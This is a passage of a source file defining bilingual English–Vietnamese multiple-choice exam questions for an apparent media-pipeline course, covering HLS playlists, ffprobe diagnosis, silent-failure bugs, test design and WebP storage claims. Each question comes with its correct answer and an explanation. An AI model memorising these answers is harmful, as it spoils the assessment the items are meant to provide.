xoá sớm thì để lại các mã 404 trong log truy cập. Đặc điểm định danh của trường hợp cache là nó không để lại dấu vết nào trên máy chủ cả.',
          ),
        }),

        // q46 · đáp án 0
        mcq({
          prompt: B(
            'A VOD encode was adapted for live and the resulting playlist inspected:' +
              code("#EXT-X-VERSION:6\n#EXT-X-TARGETDURATION:2\n#EXT-X-MEDIA-SEQUENCE:2\n#EXT-X-INDEPENDENT-SEGMENTS\n#EXTINF:2.000000,\nseg-00002.ts\n#EXTINF:2.000000,\nseg-00003.ts\n#EXTINF:2.000000,\nseg-00004.ts\n\nfile .ts còn lại trên đĩa: seg-00001 seg-00002 seg-00003 seg-00004") +
              'The command added <code>-hls_list_size 3</code> and <code>-hls_flags delete_segments</code>. What are those two doing?',
            'Một lượt encode VOD được chỉnh cho live và playlist thu được đem soi:' +
              code("#EXT-X-VERSION:6\n#EXT-X-TARGETDURATION:2\n#EXT-X-MEDIA-SEQUENCE:2\n#EXT-X-INDEPENDENT-SEGMENTS\n#EXTINF:2.000000,\nseg-00002.ts\n#EXTINF:2.000000,\nseg-00003.ts\n#EXTINF:2.000000,\nseg-00004.ts\n\nfile .ts còn lại trên đĩa: seg-00001 seg-00002 seg-00003 seg-00004") +
              'Câu lệnh đã thêm <code>-hls_list_size 3</code> và <code>-hls_flags delete_segments</code>. Hai cái đó đang làm gì?',
          ),
          options: [
            B(
              '<code>-hls_list_size 3</code> makes the playlist a sliding window of three entries rather than a complete list, which is why it starts at <code>seg-00002</code> and why <code>#EXT-X-MEDIA-SEQUENCE</code> is 2 — that tag tells the player the index of the first entry so it can track position across refreshes. <code>delete_segments</code> then removes files that scrolled out, so a 24-hour stream at two-second segments does not leave 43,200 files behind; it keeps a small margin (<code>seg-00001</code> is still there) so viewers slightly behind the live edge do not get a 404.',
              '<code>-hls_list_size 3</code> làm playlist thành một CỬA SỔ TRƯỢT ba mục thay vì một danh sách đầy đủ, và đó là lý do nó bắt đầu từ <code>seg-00002</code> và lý do <code>#EXT-X-MEDIA-SEQUENCE</code> bằng 2 — thẻ đó nói cho trình phát biết chỉ số của mục đầu tiên để nó theo dõi được vị trí qua các lần làm mới. <code>delete_segments</code> thì xoá những file đã trượt ra, để một luồng 24 giờ với segment hai giây không để lại 43.200 file; nó giữ một biên nhỏ (<code>seg-00001</code> vẫn còn đó) để người xem hơi tụt sau mép trực tiếp không nhận 404.',
            ),
            B(
              '<code>-hls_list_size 3</code> limits how many segments ffmpeg keeps in memory before flushing to disk, and <code>delete_segments</code> removes the temporary files it used while muxing; neither affects the playlist, whose contents are decided by <code>-hls_time</code> alone.',
              '<code>-hls_list_size 3</code> giới hạn số segment ffmpeg giữ trong bộ nhớ trước khi xả xuống đĩa, còn <code>delete_segments</code> xoá các file tạm nó dùng trong lúc mux; không cái nào ảnh hưởng tới playlist, vốn có nội dung do một mình <code>-hls_time</code> quyết định.',
            ),
            B(
              '<code>-hls_list_size 3</code> sets the player\'s buffer depth to three segments, and <code>delete_segments</code> is what makes that safe by guaranteeing no segment outlives the buffer; <code>#EXT-X-MEDIA-SEQUENCE</code> is the count of segments deleted so far.',
              '<code>-hls_list_size 3</code> đặt độ sâu bộ đệm của trình phát thành ba segment, còn <code>delete_segments</code> là thứ làm điều đó an toàn bằng cách bảo đảm không segment nào sống lâu hơn bộ đệm; <code>#EXT-X-MEDIA-SEQUENCE</code> là số segment đã bị xoá cho tới lúc đó.',
            ),
            B(
              'Together they implement DVR: the list size is how far back a viewer may seek, and <code>delete_segments</code> enforces that window on disk. Without them a live stream would be unseekable, which is the actual difference between a live and a VOD playlist.',
              'Cùng nhau chúng cài đặt tính năng DVR: kích thước danh sách là mức người xem tua lui được, và <code>delete_segments</code> thi hành cửa sổ đó trên đĩa. Không có chúng thì một luồng trực tiếp sẽ không tua được, và đó mới là khác biệt thật giữa một playlist live và một playlist VOD.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'A VOD playlist is a complete list that never changes once the encode finishes. A live playlist is a window that moves: entries appear at the end and disappear from the front, and <code>#EXT-X-MEDIA-SEQUENCE</code> is what stops a player losing its place — it names the index of the first entry, so a client that refreshes and sees the list start at 2 knows exactly which segments it has already played. Here the window is three, so seg-00000 and seg-00001 have scrolled off, and the sequence number moved to 2. On disk, <code>delete_segments</code> is the housekeeping half; without it, a stream running for a day at two-second segments leaves 43,200 files in the directory. Note the margin in the measurement: seg-00001 is gone from the playlist but still on disk, because a viewer a few seconds behind the live edge is still requesting it, and deleting exactly in step with the playlist would 404 them. One caution worth carrying from this measurement: on ffmpeg 8.1.2 this playlist still ends with <code>#EXT-X-ENDLIST</code>, because the input was a finite file that ended — a genuinely open-ended live source does not produce that tag. Do not use the presence of ENDLIST as your test for "is this configured for live"; the tags that distinguish them are <code>#EXT-X-PLAYLIST-TYPE</code> and a moving <code>#EXT-X-MEDIA-SEQUENCE</code>. Options 2 and 3 invent meanings for both flags. Option 4 describes DVR, which is a related feature built on the same window but is not what these two flags are for.',
            'Một playlist VOD là một danh sách đầy đủ không bao giờ đổi một khi lượt encode xong. Một playlist live là một cửa sổ di chuyển: các mục hiện ra ở cuối rồi biến mất ở đầu, và <code>#EXT-X-MEDIA-SEQUENCE</code> là thứ ngăn trình phát lạc chỗ — nó nêu chỉ số của mục ĐẦU TIÊN, nên một client làm mới rồi thấy danh sách bắt đầu từ 2 sẽ biết chính xác nó đã phát những segment nào. Ở đây cửa sổ là ba, nên seg-00000 và seg-00001 đã trượt khỏi, và số thứ tự dời sang 2. Trên đĩa, <code>delete_segments</code> là nửa dọn dẹp; không có nó thì một luồng chạy một ngày với segment hai giây để lại 43.200 file trong thư mục. Hãy để ý cái biên trong phép đo: seg-00001 đã rời khỏi playlist nhưng vẫn còn trên đĩa, vì một người xem tụt sau mép trực tiếp vài giây vẫn đang hỏi nó, và xoá đúng nhịp với playlist sẽ trả 404 cho họ. Một lưu ý đáng mang theo từ phép đo này: trên ffmpeg 8.1.2, playlist này VẪN kết thúc bằng <code>#EXT-X-ENDLIST</code>, vì đầu vào là một file hữu hạn đã kết thúc — một nguồn trực tiếp thật sự không có điểm dừng thì không sinh ra thẻ đó. Đừng dùng sự có mặt của ENDLIST làm phép kiểm cho câu "cái này đã cấu hình cho live chưa"; những thẻ phân biệt chúng là <code>#EXT-X-PLAYLIST-TYPE</code> và một <code>#EXT-X-MEDIA-SEQUENCE</code> đang di chuyển. Phương án 2 và 3 bịa ra ý nghĩa cho cả hai cờ. Phương án 4 mô tả DVR, một tính năng liên quan dựng trên cùng cái cửa sổ đó nhưng không phải công dụng của hai cờ này.',
          ),
        }),

        /* ── Chương 9 — chẩn đoán (2 câu) ─────────────────────────────────── */

        // q47 · đáp án 2
        mcq({
          prompt: B(
            'A user writes: "the video is black on my iPhone but fine on my laptop". You have the file. What is the first thing you do, and why that first?',
            'Một người dùng viết: "video đen trên iPhone của tôi nhưng tốt trên laptop". Bạn đang có cái file. Việc đầu tiên bạn làm là gì, và vì sao lại là việc đó trước?',
          ),
          options: [
            B(
              'Reproduce it in a browser with the device toolbar set to an iPhone profile, because the report is about a rendering difference and the renderer is the only thing that differs between the two devices, and the emulator reproduces the mobile decode path faithfully enough for this.',
              'Tái hiện nó trong một trình duyệt với thanh công cụ thiết bị đặt ở hồ sơ iPhone, vì báo cáo nói về khác biệt lúc dựng hình và bộ dựng hình là thứ duy nhất khác nhau giữa hai thiết bị, và phần giả lập tái hiện đường giải mã di động đủ trung thực cho việc này.',
            ),
            B(
              'Check the CDN response headers for the object, because a black frame with working audio is the classic signature of a truncated transfer and <code>curl -I</code> settles it in one command. A truncated object also explains why the audio survives while the picture does not.',
              'Kiểm các header phản hồi của CDN cho object đó, vì một khung hình đen kèm âm thanh chạy là chữ ký kinh điển của một lượt truyền bị cắt cụt và <code>curl -I</code> giải quyết nó trong một lệnh. Một object bị cắt cụt cũng giải thích được vì sao âm thanh sống sót mà hình thì không.',
            ),
            B(
              'Run <code>ffprobe</code> on the file and read <code>pix_fmt</code>. Ask the file what it is before reading any application code — that one command eliminates most of the symptom table, and here it separates the two candidates immediately: <code>yuv420p</code> means look elsewhere, <code>yuv422p</code> or <code>yuv444p</code> means the encode omitted <code>-pix_fmt yuv420p</code> and Apple\'s H.264 decoder, which handles only 4:2:0, has nothing to show.',
              'Chạy <code>ffprobe</code> lên file rồi đọc <code>pix_fmt</code>. Hãy HỎI FILE xem nó là cái gì trước khi đọc bất kỳ dòng mã ứng dụng nào — một lệnh đó loại bỏ phần lớn bảng triệu chứng, và ở đây nó tách hai ứng viên ra ngay lập tức: <code>yuv420p</code> nghĩa là đi tìm chỗ khác, còn <code>yuv422p</code> hay <code>yuv444p</code> nghĩa là lượt encode đã bỏ sót <code>-pix_fmt yuv420p</code> và bộ giải mã H.264 của Apple, vốn chỉ xử lý được 4:2:0, không có gì để hiện.',
            ),
            B(
              'Re-encode the file at a lower CRF and ask the user to try again, because a black frame on one device and not another is nearly always a decoder giving up on a bitrate spike, and the cheapest experiment is to remove the spike — it costs nothing beyond one encode to find out.',
              'Encode lại file ở CRF thấp hơn rồi nhờ người dùng thử lại, vì một khung hình đen trên thiết bị này mà không đen trên thiết bị kia gần như luôn là chuyện một bộ giải mã bỏ cuộc trước một cú vọt bitrate, và thí nghiệm rẻ nhất là bỏ cú vọt đó đi — biết được điều đó chỉ tốn đúng một lượt encode.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The ordering rule is the point, more than the specific answer. Media symptoms present far from their cause — a sideways photo is a missing rotate three modules away, a silent GIF is a constructor option, a frozen stream is a cache header — so the first move is always to reduce the number of systems in play. Downloading the object and probing it separates the file from the headers, the CDN and the renderer, and costs about a second. Here it is decisive: the pixel format either is or is not 4:2:0, and that single field distinguishes "the encode is wrong" from "look at the delivery". The measurement earlier in this exam shows how easily the wrong value gets in — a re-encode that names a codec, a CRF and a preset but no pixel format inherits 4:4:4 straight from the source. Option 1 conflates four systems at once and adds a fifth, since a desktop browser\'s device emulation uses the desktop\'s decoders and cannot reproduce an Apple hardware decode path. Option 2 is a good second step and the right first step for a different symptom class (wrong content type, frozen manifest, seek re-downloading), but headers do not explain a decode failure. Option 4 changes two things at once, involves the user in a guess, and would not distinguish a fix from a coincidence.',
            'Quy tắc THỨ TỰ mới là điểm mấu chốt, hơn cả đáp án cụ thể. Triệu chứng media hiện ra ở rất xa nguyên nhân của nó — một tấm ảnh nằm nghiêng là một lời gọi rotate thiếu ở cách đó ba module, một GIF câm là một tuỳ chọn ở constructor, một luồng đóng băng là một header cache — nên nước đi đầu tiên luôn là giảm SỐ LƯỢNG HỆ THỐNG đang tham gia. Tải object về rồi probe nó là tách cái file ra khỏi các header, khỏi CDN và khỏi bộ dựng hình, và tốn khoảng một giây. Ở đây nó có tính quyết định: pixel format hoặc là 4:2:0 hoặc không, và riêng một trường đó phân biệt "lượt encode sai" với "hãy nhìn sang khâu phát". Phép đo ở phần trước của đề này cho thấy giá trị sai lọt vào dễ tới mức nào — một lượt encode lại có nêu codec, CRF và preset nhưng không nêu pixel format sẽ thừa kế 4:4:4 thẳng từ nguồn. Phương án 1 gộp bốn hệ thống lại một lúc rồi thêm cái thứ năm, vì phần giả lập thiết bị của một trình duyệt desktop dùng bộ giải mã của chính desktop và không tái hiện được đường giải mã phần cứng của Apple. Phương án 2 là bước thứ hai tốt và là bước đầu tiên đúng cho một LỚP triệu chứng khác (sai loại nội dung, manifest đóng băng, tua thì tải lại), nhưng header không giải thích được một lỗi giải mã. Phương án 4 đổi hai thứ cùng lúc, lôi người dùng vào một phỏng đoán, và sẽ không phân biệt được một cách vá với một sự trùng hợp.',
          ),
        }),

        // q48 · đáp án 1
        mcq({
          prompt: B(
            'Both real bugs found while writing this course returned HTTP 200, wrote a structurally valid file, and logged at most one <code>warn</code>. What three ingredients does that failure class need, and which is the practical one to remove?',
            'Cả hai bug thật tìm thấy trong lúc viết khoá này đều trả HTTP 200, ghi ra một file hợp lệ về cấu trúc, và ghi nhiều nhất một dòng <code>warn</code>. Lớp hỏng đó cần ba nguyên liệu nào, và cái nào là cái thực dụng để loại bỏ?',
          ),
          options: [
            B(
              'Bad input, missing validation and no logging. The practical one to remove is the logging gap — log the inputs and outputs of every media operation and the pattern becomes visible in aggregate within a day. Both real bugs would then have surfaced as an unusual input-to-output ratio on the dashboard.',
              'Đầu vào xấu, thiếu validation và không có log. Cái thực dụng để loại bỏ là khoảng trống log — hãy ghi log đầu vào và đầu ra của mọi thao tác media rồi cái pattern đó sẽ hiện ra trên tổng thể trong vòng một ngày. Cả hai bug thật khi đó đã lộ ra thành một tỉ lệ vào-ra bất thường trên dashboard.',
            ),
            B(
              'Output that is structurally valid, nothing comparing that output to what was intended, and a fallback or swallowed error that converts "wrong" into "different but fine". The practical one to remove is the second: assert a property that only success produces — the measured loudness, the orientation, the page count, the size ratio — and measure it on the <b>output</b>, not the input. Removing any one ingredient surfaces the bug, but the other two are usually there for good reasons.',
              'Output hợp lệ về cấu trúc, không có gì so output đó với thứ đã được DỰ ĐỊNH, và một đường dự phòng hoặc một lỗi bị nuốt biến "sai" thành "khác nhưng vẫn ổn". Cái thực dụng để loại bỏ là cái thứ hai: hãy khẳng định một thuộc tính mà chỉ thành công mới sinh ra — độ to đo được, hướng xoay, số trang, tỉ lệ kích thước — và đo nó trên <b>OUTPUT</b>, không phải trên input. Bỏ đi một nguyên liệu bất kỳ là bug lộ ra, nhưng hai cái kia thường có mặt vì những lý do chính đáng.',
            ),
            B(
              'A race condition, a retry and a cache. The practical one to remove is the retry, since it is the component that turns a single transient failure into a stable wrong answer that then gets cached and served. The cache is what makes that answer persist long enough to be found by users rather than by tests.',
              'Một race condition, một lượt retry và một cái cache. Cái thực dụng để loại bỏ là lượt retry, vì nó là thành phần biến một lỗi thoáng qua đơn lẻ thành một câu trả lời sai ổn định rồi được cache lại và đem phục vụ. Cái cache mới là thứ giữ câu trả lời đó sống đủ lâu để người dùng tìm ra thay vì bài test tìm ra.',
            ),
            B(
              'Missing types, missing tests and missing documentation. The practical one to remove is the type gap, because a discriminated union over the pipeline result makes the "wrong but valid" state unrepresentable at compile time. Documentation is the cheapest of the three to add and the one most likely to be kept current.',
              'Thiếu kiểu, thiếu test và thiếu tài liệu. Cái thực dụng để loại bỏ là khoảng trống về kiểu, vì một union phân biệt trên kết quả pipeline làm cho trạng thái "sai nhưng hợp lệ" không biểu diễn được ngay lúc biên dịch. Tài liệu là cái rẻ nhất trong ba để thêm vào và cũng là cái dễ được giữ cập nhật nhất.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Score the two bugs against the recipe and it fits both exactly. The loudness bug: valid output (a correct 192 kbps MP3 that plays everywhere), nothing comparing it to intent (nothing measured the output\'s loudness), and a fallback (the <code>catch</code> re-encoded without normalisation and returned success). The injection: valid output (the thumbnail was produced correctly — ffmpeg ran, and so did the injected command), nothing asserting that <em>only</em> ffmpeg ran, and a fallback (<code>catch { return null }</code> made even total failure non-fatal by design). Removing any one ingredient surfaces the bug, but the other two usually deserve to stay: output is supposed to be valid, and a non-fatal thumbnail failure is a deliberate and correct choice. So the lever is the missing comparison. Pick a property that is <em>false</em> when the bug is present and measure it on the artifact you produced — re-measure the encoded audio and expect ≈ -14 LUFS, assert the rotated image is taller than it is wide, assert the animated output has 48 pages, watch the compression ratio in aggregate. Pair that with counting every fallback, because a path expected to be rare that fires on 100% of requests is the loudest signal available — but only if something is counting. Option 1 names a plausible trio, but neither bug involved bad input or absent logging; both logged, and nobody read it. Options 3 and 4 describe unrelated failure classes.',
            'Chấm hai cái bug theo công thức này thì nó khớp cả hai một cách chính xác. Bug độ to: output hợp lệ (một file MP3 192 kbps đúng chuẩn, phát được mọi nơi), không gì so nó với ý định (không gì đo độ to của output), và một đường dự phòng (khối <code>catch</code> encode lại không chuẩn hoá rồi trả về thành công). Vụ injection: output hợp lệ (thumbnail được sinh ra đúng — ffmpeg đã chạy, và cái lệnh được chèn cũng đã chạy), không gì khẳng định rằng CHỈ ffmpeg đã chạy, và một đường dự phòng (<code>catch { return null }</code> làm cho cả một lần hỏng hoàn toàn cũng không gây tử vong, theo đúng thiết kế). Bỏ đi một nguyên liệu bất kỳ là bug lộ ra, nhưng hai cái kia thường xứng đáng được ở lại: output đáng lẽ phải hợp lệ, và một lần hỏng thumbnail không gây tử vong là lựa chọn cố ý và đúng đắn. Nên cái cần gạt là PHÉP SO SÁNH CÒN THIẾU. Hãy chọn một thuộc tính SAI khi bug có mặt rồi đo nó trên chính hiện vật bạn sinh ra — đo lại âm thanh đã encode và kỳ vọng ≈ -14 LUFS, khẳng định tấm ảnh đã xoay cao hơn chiều rộng của nó, khẳng định output động có 48 trang, theo dõi tỉ lệ nén trên tổng thể. Hãy đi kèm việc ĐẾM mọi đường dự phòng, vì một đường được kỳ vọng là hiếm mà phát tác trên 100% số request là tín hiệu to nhất có thể có — nhưng chỉ khi có thứ gì đó đang đếm. Phương án 1 nêu một bộ ba nghe hợp lý, nhưng không bug nào trong hai liên quan tới đầu vào xấu hay thiếu log; cả hai đều có ghi log, chỉ là không ai đọc. Phương án 3 và 4 mô tả những lớp hỏng không liên quan.',
          ),
        }),

        /* ── Chương 10 — tổng kết (2 câu) ─────────────────────────────────── */

        // q49 · đáp án 1
        mcq({
          prompt: B(
            'You inherit a media pipeline with no tests. You can add exactly three assertions before your next deploy. Which three, and what makes them the right three?',
            'Bạn tiếp quản một đường ống media không có bài test nào. Bạn được thêm đúng ba phép khẳng định trước lần deploy kế tiếp. Chọn ba cái nào, và điều gì làm chúng là ba cái đúng?',
          ),
          options: [
            B(
              'That <code>optimizeImage</code> does not throw on a valid JPEG, that <code>ffprobe</code> exits zero on the transcoded output, and that the upload route returns 200 for a well-formed request — three smoke tests covering the three subsystems, each fast enough to run on every commit.',
              'Rằng <code>optimizeImage</code> không ném lỗi với một JPEG hợp lệ, rằng <code>ffprobe</code> thoát với mã 0 trên output đã transcode, và rằng route upload trả 200 cho một yêu cầu đúng khuôn — ba phép kiểm khói bao ba hệ thống con, mỗi cái đủ nhanh để chạy ở mọi lượt commit.',
            ),
            B(
              'On a portrait fixture with EXIF orientation 6, that the output is taller than it is wide. On an animated GIF fixture, that the output\'s page count equals the source\'s. On a deliberately quiet audio fixture, that re-measuring the <em>output</em> gives roughly the target LUFS. All three assert a property of the artifact that is false exactly when a known silent bug is present — and each would have failed while the real bug was live, which is what a test in this domain has to do.',
              'Trên một file mẫu ảnh dọc có EXIF orientation 6, khẳng định output CAO hơn rộng. Trên một file mẫu GIF động, khẳng định số trang của output bằng số trang của nguồn. Trên một file mẫu âm thanh cố ý làm nhỏ tiếng, khẳng định việc đo lại <em>OUTPUT</em> cho ra xấp xỉ mức LUFS mục tiêu. Cả ba đều khẳng định một thuộc tính của hiện vật, thuộc tính đó SAI đúng vào lúc một bug câm đã biết có mặt — và mỗi cái đều đã thất bại trong lúc bug thật còn sống, và đó chính là việc mà một bài test trong lĩnh vực này phải làm được.',
            ),
            B(
              'That the pixel budget rejects a 16000×16000 PNG, that the SVG gate rejects <code>image/svg+xml</code>, and that a filename containing a semicolon does not execute a command — the three security guards, since a security regression is more expensive than a correctness one.',
              'Rằng ngân sách pixel từ chối một PNG 16000×16000, rằng cổng SVG từ chối <code>image/svg+xml</code>, và rằng một tên file chứa dấu chấm phẩy không thực thi được lệnh nào — ba chốt chặn bảo mật, vì một lần thụt lùi về bảo mật đắt hơn một lần thụt lùi về tính đúng đắn.',
            ),
            B(
              'Snapshot tests on the three output buffers, comparing byte-for-byte against committed golden files — the strongest possible assertion, since any change to any encoder setting, library version or input handling shows up immediately as a diff.',
              'Ba bài test ảnh chụp trên ba buffer output, so từng byte với các file vàng đã commit — phép khẳng định mạnh nhất có thể, vì mọi thay đổi ở bất kỳ thiết lập encoder, phiên bản thư viện hay cách xử lý đầu vào nào đều hiện ra ngay lập tức thành một diff.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The criterion for a good test here is narrow and worth stating: it must fail while the bug is present. Every silent failure in this course returns normally and writes a valid file, so "did not throw" and "exit code zero" pass in all of them — which is why option 1, despite covering three subsystems, would not have caught a single one of the bugs the course documents. The three in the answer are chosen because each is a property of the artifact that flips: a portrait fixture at orientation 6 comes back landscape exactly when <code>.rotate()</code> is missing; an animated source comes back with one page exactly when <code>{ animated: true }</code> is missing from the constructor; and re-measuring encoded audio reads the source loudness rather than the target exactly when pass 2 never applied its measured values. Option 3 names three guards genuinely worth testing, and they belong in the suite — but security regressions in this codebase were introduced by inconsistency rather than by removal, and the correctness bugs were the ones that shipped and stayed. If you get more than three assertions, add these next. Option 4 is the classic trap: golden files over encoder output break on every library upgrade for reasons unrelated to your code, so they get regenerated reflexively, and a test that is routinely regenerated asserts nothing at all.',
            'Tiêu chí cho một bài test tốt ở đây rất hẹp và đáng nói thẳng: nó phải THẤT BẠI trong lúc bug có mặt. Mọi kiểu hỏng câm trong khoá này đều trả về bình thường và ghi ra một file hợp lệ, nên "không ném lỗi" và "mã thoát bằng 0" đều PASS ở tất cả — và đó là lý do phương án 1, dù bao được ba hệ thống con, sẽ không bắt được lấy một bug nào mà khoá này ghi lại. Ba cái trong đáp án được chọn vì mỗi cái là một thuộc tính của hiện vật và nó lật: một file mẫu ảnh dọc ở orientation 6 trở về thành ảnh ngang đúng vào lúc thiếu <code>.rotate()</code>; một nguồn động trở về với một trang đúng vào lúc thiếu <code>{ animated: true }</code> ở constructor; và đo lại âm thanh đã encode sẽ ra độ to của NGUỒN chứ không phải của MỤC TIÊU đúng vào lúc lượt 2 chưa bao giờ áp được các giá trị đo của nó. Phương án 3 nêu ba chốt chặn thật sự đáng test, và chúng thuộc về bộ test — nhưng những lần thụt lùi bảo mật trong kho mã này đến từ sự thiếu nhất quán chứ không phải từ việc gỡ bỏ, còn các bug về tính đúng đắn mới là những cái đã ship và đã ở lại. Nếu bạn được thêm hơn ba phép khẳng định, hãy thêm mấy cái này tiếp theo. Phương án 4 là cái bẫy kinh điển: các file vàng đặt trên output của encoder sẽ vỡ ở mọi lần nâng cấp thư viện vì những lý do chẳng liên quan gì tới mã của bạn, nên chúng bị sinh lại theo phản xạ, và một bài test bị sinh lại thường xuyên thì chẳng khẳng định được gì cả.',
          ),
        }),

        // q50 · đáp án 2
        mcq({
          prompt: B(
            'A design doc states "WebP is 30% smaller than JPEG, so switching saves us 30% of image storage". Four files were measured through the same pipeline and produced ratios of 0.034, 0.311, 0.134 and 1.241 against their sources. What is wrong with the claim?',
            'Một tài liệu thiết kế viết "WebP nhỏ hơn JPEG 30%, nên chuyển sang sẽ tiết kiệm 30% dung lượng ảnh". Bốn file được đo qua cùng một pipeline và cho ra các tỉ lệ 0,034 · 0,311 · 0,134 và 1,241 so với nguồn của chúng. Khẳng định đó sai ở đâu?',
          ),
          options: [
            B(
              'The figure is out of date rather than wrong in kind: WebP\'s advantage over JPEG has widened since it was published, so the real saving is larger than 30% and the doc is merely conservative.',
              'Con số đó lạc hậu chứ không sai về bản chất: lợi thế của WebP so với JPEG đã nới rộng kể từ khi con số ấy được công bố, nên khoản tiết kiệm thật lớn hơn 30% và tài liệu chỉ đang thận trọng thôi.',
            ),
            B(
              'The comparison is invalid because the ratios above are against the <em>source</em> rather than against a JPEG re-encode at matched quality; measured properly against JPEG, all four would cluster near 0.7 and the claim would hold.',
              'Phép so sánh không hợp lệ vì các tỉ lệ ở trên là so với NGUỒN chứ không so với một bản JPEG encode lại ở cùng mức chất lượng; nếu đo cho đúng so với JPEG thì cả bốn sẽ tụm gần 0,7 và khẳng định kia sẽ đúng.',
            ),
            B(
              'A ratio is a property of specific content at a specific size with specific settings, not of a format. The measured spread here is 36× across four files from one pipeline, and one of them came out <em>larger</em> than its source — so a single number cannot predict a storage bill. Run the pipeline over ten files from your own bucket before relying on any published figure; it takes a minute and it is the difference between a number and a belief.',
              'Một tỉ lệ là tính chất của NỘI DUNG CỤ THỂ ở một kích thước cụ thể với những thiết lập cụ thể, chứ không phải tính chất của một ĐỊNH DẠNG. Khoảng trải đo được ở đây là 36 lần trên bốn file qua cùng một pipeline, và một trong số đó ra TO HƠN nguồn của nó — nên một con số duy nhất không dự báo được một hoá đơn lưu trữ. Hãy chạy pipeline trên mười file lấy từ chính bucket của bạn trước khi dựa vào bất kỳ con số công bố nào; nó tốn một phút và nó là khác biệt giữa một CON SỐ và một NIỀM TIN.',
            ),
            B(
              'The error is in the direction of the saving: storage is cumulative while the re-encode is a one-off, so a 30% reduction applies only to newly uploaded objects and the doc should have said 30% of the monthly growth rather than 30% of the total.',
              'Sai lầm nằm ở chiều của khoản tiết kiệm: dung lượng thì tích luỹ còn lượt encode lại là một lần duy nhất, nên mức giảm 30% chỉ áp cho các object mới upload và tài liệu đáng lẽ phải nói 30% của phần TĂNG hằng tháng chứ không phải 30% của tổng.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'This is the habit the whole course is built to leave behind. Every ratio in these ten chapters is labelled with its input precisely so it can be checked rather than quoted, because the same settings produce wildly different outcomes on different content: a detailed photograph at 0.034, a screenshot at 0.311, an avatar at 0.134, and an already-optimised small JPEG at 1.241 — which is not a saving at all but a 24% increase, and worse quality besides, since a second lossy pass reproduces the first encoder\'s artifacts and adds its own. Four files, one pipeline, a 36× spread. A published "30% smaller" was measured on somebody else\'s corpus at somebody else\'s dimensions with somebody else\'s quality setting, and quoting it as a forecast for your bill is how a migration lands 4× off. The remedy is cheap and the lesson insists on it: pull ten files from your own bucket, run them, and read your own numbers. Option 4 makes a genuinely important point that appears in Chapter 6 — CPU is spent once while storage is cumulative, which is why skipping a variant beats encoding it faster — but it is a correction to the <em>arithmetic</em> of the claim rather than to its foundation, and it would still be wrong even if applied only to growth. Option 1 defends the number instead of questioning where it came from. Option 2 proposes a fairer comparison, which is worth doing, but a matched-quality benchmark on someone else\'s corpus is still someone else\'s corpus.',
            'Đây chính là thói quen mà cả khoá học được dựng ra để để lại. Mọi tỉ lệ trong mười chương này đều được ghi kèm đầu vào của nó chính là để nó có thể được KIỂM chứ không phải được TRÍCH, vì cùng những thiết lập ấy cho ra những kết quả khác nhau một trời một vực trên những nội dung khác nhau: một tấm ảnh nhiều chi tiết ở 0,034, một ảnh chụp màn hình ở 0,311, một avatar ở 0,134, và một JPEG nhỏ vốn đã tối ưu ở 1,241 — vốn không phải tiết kiệm gì mà là TĂNG 24%, kèm chất lượng tệ hơn, vì một lượt nén mất dữ liệu thứ hai tái tạo artifact của bộ encode trước rồi cộng thêm của chính nó. Bốn file, một pipeline, khoảng trải 36 lần. Một con số "nhỏ hơn 30%" đã công bố là đo trên tập mẫu của người khác, ở kích thước của người khác, với thiết lập chất lượng của người khác, và trích nó ra làm dự báo cho hoá đơn của bạn là cách một cuộc di chuyển lệch đi 4 lần. Cách chữa thì rẻ và bài học thì khăng khăng đòi: lấy mười file từ chính bucket của bạn, chạy chúng, và đọc con số của chính bạn. Phương án 4 nêu một điểm thật sự quan trọng có xuất hiện ở Chương 6 — CPU tiêu một lần còn dung lượng thì tích luỹ, và đó là lý do bỏ bớt một variant thắng việc encode nó nhanh hơn — nhưng đó là một chỉnh sửa cho phần SỐ HỌC của khẳng định chứ không phải cho nền móng của nó, và nó vẫn sai kể cả khi chỉ áp cho phần tăng trưởng. Phương án 1 bênh vực con số thay vì chất vấn xem nó từ đâu ra. Phương án 2 đề xuất một phép so sánh công bằng hơn, và điều đó đáng làm, nhưng một benchmark cùng mức chất lượng trên tập mẫu của người khác thì vẫn là tập mẫu của người khác.',
          ),
        }),

      ],
    },
  ],
};
